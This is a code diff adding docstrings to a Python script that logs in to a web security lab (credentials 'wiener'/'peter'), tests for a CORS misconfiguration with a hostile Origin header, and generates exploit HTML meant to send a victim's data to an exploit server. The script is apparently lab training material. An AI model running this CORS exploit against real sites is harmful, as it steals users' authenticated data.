@@ -2,10 +2,20 @@ import requests
 from bs4 import BeautifulSoup
 
 def login_and_get_session(base_url, username, password):
+    """
+    Tries to log in to the provided base URL using different possible login paths.
+    
+    Args:
+        base_url (str): The base URL of the website.
+        username (str): The username to use for logging in.
+        password (str): The password to use for logging in.
+    
+    Returns:
+        requests.Session: A session object if login is successful, otherwise None.
+    """
     possible_login_paths = ['/login', '/user/login', '/signin', '/account/login']
     session = requests.Session()
     
-    # Try different login paths
     for login_path in possible_login_paths:
         login_url = base_url.rstrip('/') + login_path
         login_page = session.get(login_url)
@@ -32,6 +42,17 @@ def login_and_get_session(base_url, username, password):
         return None
 
 def check_cors_vulnerability(session, url, evil_origin):
+    """
+    Checks if the given URL is vulnerable to CORS exploitation.
+    
+    Args:
+        session (requests.Session): The session object to use for making the request.
+        url (str): The URL to check for CORS vulnerability.
+        evil_origin (str): The origin to use for testing CORS vulnerability.
+    
+    Returns:
+        bool: True if the site is vulnerable, False otherwise.
+    """
     headers = {'Origin': evil_origin, 'User-Agent': 'Mozilla/5.0'}
     try:
         response = session.get(url, headers=headers)
@@ -49,6 +70,16 @@ def check_cors_vulnerability(session, url, evil_origin):
         return False
 
 def exploit_cors_vulnerability(lab_url, exploit_server_url):
+    """
+    Generates an HTML script to exploit a CORS vulnerability.
+    
+    Args:
+        lab_url (str): The URL of the lab or site with the vulnerability.
+        exploit_server_url (str): The URL of the server to send the stolen data to.
+    
+    Returns:
+        str: A string containing the exploit HTML script.
+    """
     exploit_html = f"""
     <script>
         var req = new XMLHttpRequest();
@@ -65,6 +96,15 @@ def exploit_cors_vulnerability(lab_url, exploit_server_url):
     return exploit_html
 
 def check_and_exploit_cors(base_url):
+    """
+    Checks for CORS vulnerability and generates an exploit if the site is vulnerable.
+    
+    Args:
+        base_url (str): The base URL of the site to check and exploit.
+    
+    Returns:
+        list: A list of results and the exploit HTML if vulnerable.
+    """
     username = "wiener"
     password = "peter"
     evil_origin = "https://example.com"
